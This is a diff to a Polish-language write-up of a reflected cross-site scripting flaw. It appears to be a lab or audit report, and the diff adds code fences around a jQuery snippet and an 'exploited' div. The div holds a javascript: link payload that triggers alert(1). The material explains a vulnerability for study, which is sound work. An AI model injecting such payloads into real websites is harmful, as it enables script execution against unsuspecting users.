@@ -20,15 +20,19 @@ Przy pomocy takiego oprogramowania jak BurpSuite lub zwykłego zapytania przy po
 Przekazane parametry funkcji są bezpośrednio dostarczane do <div ReflectedXSSExecutionPoint="1" class="footer"> co przez przykładowe wyrażenie '<a href=javascript:alert(1)>xss</a>' pozwala na urchomienie funkcji alert(1) w języku javascript przez uruchomienie hiperłącza co zostało pokazane na obrazku w sekcji OPIS
 
 Funkcja:
+```
 $(function() {
 		$('[ReflectedXSSExecutionPoint]').attr("title", "");
 		$('[ReflectedXSSExecutionPoint]').balloon();
 	});
+```
  
 Wyeksploitowany DIV:
+```
 <div style="border: 1px solid black;">
 <div ReflectedXSSExecutionPoint="1" class="footer">Browser: <a href=javascript:alert(1)>xss</a></div>
 <div class="footer">PHP Version: 5.3.2-1ubuntu4.30</div>"
 </div>
+```
  
 Źródło: https://security.stackexchange.com/questions/24908/is-it-possible-to-make-an-xss-with-only-html-tags
